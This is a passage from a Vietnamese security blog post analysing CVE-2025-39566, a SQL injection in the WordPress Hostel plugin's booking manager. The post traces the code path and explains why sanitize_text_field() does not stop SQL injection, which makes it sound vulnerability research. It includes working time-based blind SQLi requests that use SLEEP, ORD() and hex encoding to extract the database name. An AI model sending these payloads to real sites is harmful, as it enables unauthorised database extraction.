</span></span><span class="line"><span class="cl">    <span class="c1">// another logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></div></div>
<p>{: file=&ldquo;models/hostel.php&rdquo; v1.1.5.6 }</p>
<p>Ở đây:</p>
<ul>
<li><code>add_menu_page()</code> tạo <strong>menu chính</strong> trong Admin Dashboard.</li>
<li><code>add_submenu_page()</code> thêm các <strong>submenu</strong> con cho menu đó.</li>
<li>Tham số <code>$callback</code> là một <strong>callback function</strong> sẽ được gọi khi người dùng click vào menu/submenu.</li>
</ul>
<p>Ví dụ:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = &#39;&#39;, $icon_url = &#39;&#39;, $position = null);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">add_menu_page</span><span class="p">(</span><span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Hostel&#39;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Hostel&#39;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s2">&#34;wphostel_options&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="k">array</span><span class="p">(</span><span class="no">__CLASS__</span><span class="p">,</span> <span class="s2">&#34;options&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = &#39;&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">add_submenu_page</span><span class="p">(</span><span class="s1">&#39;wphostel_options&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Manage Bookings&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Manage Bookings&#34;</span><span class="p">,</span> <span class="s1">&#39;wphostel&#39;</span><span class="p">),</span> <span class="nv">$wphostel_caps</span><span class="p">,</span> <span class="s1">&#39;wphostel_bookings&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;WPHostelBookings&#39;</span><span class="p">,</span> <span class="s2">&#34;manage&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// array(&#39;WPHostelBookings&#39;, &#34;manage&#34;)); =&gt; WPHostelBookings::manage()
</span></span></span></code></pre></div></div>
<p>Tất cả menu/submenu này đều được đăng ký bên trong hàm static <code>menu()</code> của class <code>WPHostel</code>. Do đó, để xác định nơi hàm <code>menu()</code> được gọi, ta có thể tìm kiếm từ khóa <code>menu</code> trong thư mục chứa plugin.</p>
<p><figure><a class="lightgallery" href="search_menu.pngm" title="search menu()" data-thumbnail="search_menu.pngm" data-sub-html="<h2>Search menu</h2><p>search menu()</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="search_menu.pngm"
            data-srcset="search_menu.pngm, search_menu.pngm 1.5x, search_menu.pngm 2x"
            data-sizes="auto"
            alt="search_menu.pngm" />
    </a><figcaption class="image-caption">Search menu</figcaption>
    </figure></p>
<p>Trong file <code>hostel.php</code> ở thư mục gốc của plugin ta có:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">add_action</span><span class="p">(</span><span class="s1">&#39;admin_menu&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;WPHostel&#34;</span><span class="p">,</span> <span class="s2">&#34;menu&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// =&gt; callback: WPHostel::menu()
</span></span></span></code></pre></div></div>
<p>{: file=&ldquo;hostel.php&rdquo; }</p>
<ul>
<li><code>add_action()</code> là một <strong>Plugin API</strong> của WordPress, cho phép gắn một <strong>callback</strong> vào một <strong>action hook</strong>.</li>
<li>Hook name ở đây là <code>admin_menu</code>, nghĩa là hàm <code>WPHostel::menu()</code> sẽ được gọi trong vòng đời khi WordPress dựng Admin Dashboard Menu.</li>
</ul>
<p><strong>Menu trên UI Admin Dashboard</strong></p>
<p><figure><a class="lightgallery" href="/2025-08-25-cve-2025-39566/menu_ui.png" title="ui menu" data-thumbnail="/2025-08-25-cve-2025-39566/menu_ui.png" data-sub-html="<h2>Menu trên UI Admin Dashboard</h2><p>ui menu</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-08-25-cve-2025-39566/menu_ui.png"
            data-srcset="/2025-08-25-cve-2025-39566/menu_ui.png, /2025-08-25-cve-2025-39566/menu_ui.png 1.5x, /2025-08-25-cve-2025-39566/menu_ui.png 2x"
            data-sizes="auto"
            alt="/2025-08-25-cve-2025-39566/menu_ui.png" width="329" height="192" />
    </a><figcaption class="image-caption">Menu trên UI Admin Dashboard</figcaption>
    </figure></p>
<p><strong>Debugging</strong></p>
<ul>
<li>Chức năng bị lỗi nằm trong <strong>Booking Manager</strong>, vì vậy ta truy cập vào submenu <code>Manager Bookings</code> trên UI Admin Dashboard.</li>
<li>Ngay trước nhánh default có comment <code>// list bookings</code> =&gt; cho thấy đoạn code này xử lý việc <strong>liệt kê và sắp xếp bookings</strong></li>
<li>Mở debugger:
<ul>
<li>Click <kbd>Run with Debugger</kbd>.</li>
<li>Đặt <strong>breakpoint</strong> tại <strong>nhánh switch chứa code lỗi</strong> và <strong>tại dòng code gây lỗi</strong>.</li>
</ul>
</li>
<li>Khi click vào một cột trong bảng bookings, quan sát:
<ul>
<li>Debugger nhảy vào cấu trúc <code>switch</code>.</li>
<li>Dùng <strong>Step Over</strong>, debugger đi tiếp vào nhánh <code>default</code>.</li>
<li>Tiếp tục <strong>Step Over</strong> và theo dõi giá trị biến trong tab <code>Variables &gt; Locals</code>. Các biến này sẽ kết hợp để tạo thành câu SQL bên dưới.</li>
</ul>
</li>
</ul>
<p>Sau khi ghép các biến, câu query đầy đủ có dạng:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">SQL_CALC_FOUND_ROWS</span><span class="w"> </span><span class="n">tB</span><span class="p">.</span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">tR</span><span class="p">.</span><span class="n">title</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">room</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="n">wp_hostel_bookings</span><span class="w"> </span><span class="n">tB</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">JOIN</span><span class="w"> </span><span class="n">wp_hostel_rooms</span><span class="w"> </span><span class="n">tR</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">tR</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tB</span><span class="p">.</span><span class="n">room_id</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">WHERE</span><span class="w"> </span><span class="n">is_static</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">tB</span><span class="p">.</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">...</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">tB</span><span class="p">.</span><span class="n">amount_paid</span><span class="w"> </span><span class="k">ASC</span><span class="o">|</span><span class="k">DESC</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">LIMIT</span><span class="w"> </span><span class="p">...</span></span></span></code></pre></div></div>
<p>Đáng chú ý, biến <code>$orderby</code> được gán như sau:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">]))</span> <span class="p">{</span>					
</span></span><span class="line"><span class="cl">    <span class="nv">$orderby</span> <span class="o">=</span> <span class="s2">&#34;ORDER BY &#34;</span><span class="o">.</span><span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ob&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>⚠️ Ở đây có điểm bất thường:</p>
<ul>
<li>Phần sau <code>ORDER BY</code> sử dụng <code>sanitize_text_field()</code>.</li>
<li>Hàm này chỉ <strong>loại bỏ/escape HTML</strong>, không hề filter hoặc validate để đảm bảo an toàn trong <strong>SQL context</strong>.</li>
<li>Tham số <code>ob</code> (do người dùng truyền vào) vì vậy có thể bị lợi dụng để <strong>chèn trực tiếp vào câu SQL</strong>.</li>
</ul>
<p><strong>Request with BurpSuite</strong>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin.php?page=wphostel_bookings&amp;type=upcoming&amp;ob=tB.status,(SELECT+SLEEP(10))&amp;dir=ASC</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></div></div>
<p>Ta tách mệnh đề <code>ORDER BY</code> bằng <code>,</code> vì nó chấp nhập <strong>multi column</strong></p>
<p><figure><a class="lightgallery" href="/2025-08-25-cve-2025-39566/time_response.png" title="time response" data-thumbnail="/2025-08-25-cve-2025-39566/time_response.png" data-sub-html="<h2>Time response</h2><p>time response</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-08-25-cve-2025-39566/time_response.png"
            data-srcset="/2025-08-25-cve-2025-39566/time_response.png, /2025-08-25-cve-2025-39566/time_response.png 1.5x, /2025-08-25-cve-2025-39566/time_response.png 2x"
            data-sizes="auto"
            alt="/2025-08-25-cve-2025-39566/time_response.png" width="426" height="259" />
    </a><figcaption class="image-caption">Time response</figcaption>
    </figure></p>
<p>Kết quả: thời gian phản hồi bị delay =&gt; SQL Injection thành công.</p>
<h3 id="dump-data-from-database">Dump Data from Database</h3>
<p><strong>Bypass <code>'</code> using ORD()</strong>:</p>
<p>Để dump dữ liệu của database ta cần thử để lấy ký tự đầu tiên của <strong>database name</strong>.</p>
<p>Do <code>sanitize_text_field()</code> loại bỏ <code>'</code>, ta không dùng được payload so sánh trực tiếp. Thay vào đó dùng <code>ORD()</code> để so sánh ký tự theo ASCII:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin.php?page=wphostel_bookings&amp;type=past&amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))&amp;dir=ASC</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></div></div>
<p>Thành công bypass =&gt; có thể trích xuất tên database.</p>
<p><figure><a class="lightgallery" href="/2025-08-25-cve-2025-39566/ord_bypass.png" title="ORD bypass" data-thumbnail="/2025-08-25-cve-2025-39566/ord_bypass.png" data-sub-html="<h2>ORD bypass</h2><p>ORD bypass</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-08-25-cve-2025-39566/ord_bypass.png"
            data-srcset="/2025-08-25-cve-2025-39566/ord_bypass.png, /2025-08-25-cve-2025-39566/ord_bypass.png 1.5x, /2025-08-25-cve-2025-39566/ord_bypass.png 2x"
            data-sizes="auto"
            alt="/2025-08-25-cve-2025-39566/ord_bypass.png" width="435" height="287" />
    </a><figcaption class="image-caption">ORD bypass</figcaption>
    </figure></p>
<p><strong>Bypass <code>'</code> using Hex encoding (extend)</strong></p>
<p>Ngoài <code>ORD()</code> ta có thể sử dụng <strong>Hex encoding</strong> để bypass</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin.php?page=wphostel_bookings&amp;type=past&amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))&amp;dir=ASC</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></div></div>
<p>Thành công bypass =&gt; có thể trích xuất tên database.</p>
<p><figure><a class="lightgallery" href="/2025-08-25-cve-2025-39566/ord_bypass.png" title="Hex encoding bypass" data-thumbnail="/2025-08-25-cve-2025-39566/ord_bypass.png" data-sub-html="<h2>Hex encoding bypass</h2><p>Hex encoding bypass</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-08-25-cve-2025-39566/ord_bypass.png"
            data-srcset="/2025-08-25-cve-2025-39566/ord_bypass.png, /2025-08-25-cve-2025-39566/ord_bypass.png 1.5x, /2025-08-25-cve-2025-39566/ord_bypass.png 2x"
            data-sizes="auto"
            alt="/2025-08-25-cve-2025-39566/ord_bypass.png" width="435" height="287" />
    </a><figcaption class="image-caption">Hex encoding bypass</figcaption>
    </figure></p>
<hr>
<h2 id="remediation">Remediation</h2>
<p>Cập nhật lên <strong>Hostel Plugin v1.1.5.7</strong> hoặc mới hơn</p>
<hr>
<h2 id="takeaways">Takeaways</h2>
<ul>
<li><code>sanitize_text_field()</code> ≠ chống <strong>SQL Injection</strong></li>
<li>Cần phân biệt rõ: lọc input cho HTML vs cho SQL</li>
</ul>
<hr>
<h2 id="references">References</h2>
<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener noreffer ">SQL Injection Cheat Sheet – PortSwigger</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-1-1-5-6-sql-injection-vulnerability?_s_id=cve" target="_blank" rel="noopener noreffer ">WordPress Hostel Plugin &lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack</a></p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Cập nhật ngày 2025-09-21</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/vi/2025-08-25-cve-2025-39566/index.md" target="_blank">Đọc với định dạng Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="x" data-url="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" data-title="CVE-2025-39566 Analysis &amp; POC" data-hashtags="analyst,plugin,sqli"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Threads" data-sharer="threads" data-url="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" data-title="CVE-2025-39566 Analysis &amp; POC"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" data-hashtag="analyst"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" data-title="CVE-2025-39566 Analysis &amp; POC"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Line" data-sharer="line" data-url="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" data-title="CVE-2025-39566 Analysis &amp; POC"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên 微博" data-sharer="weibo" data-url="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" data-title="CVE-2025-39566 Analysis &amp; POC" data-image="app.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/vi/2025-08-25-cve-2025-39566/" data-title="CVE-2025-39566 Analysis &amp; POC" data-description="Security Vulnerability in WordPress Hostel Plugin."><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fvi%2f2025-08-25-cve-2025-39566%2f&amp;text=CVE-2025-39566%20Analysis%20%26%20POC" target="_blank" title="Chia sẻ trên Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/vi/tags/analyst/">Analyst</a>,&nbsp;<a href="/vi/tags/plugin/">Plugin</a>,&nbsp;<a href="/vi/tags/sqli/">Sqli</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/vi/2025-08-21-wordpress-local-and-debugging/" class="prev" rel="prev" title="WordPress Local and Debugging"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>WordPress Local and Debugging</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://w41bu1.github.io" target="_blank">w41bu1</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Lên trên">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Xem bình luận">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"GZT24PWKNT","algoliaIndex":"index","algoliaSearchKey":"634ab679e825b815de2663de38908f9d","highlightTag":"em","maxResultLength":10,"noResultsFound":"Không tìm thấy","snippetLength":50,"type":"algolia"}};</script><script src="/js/theme.min.js"></script></body>
</html>
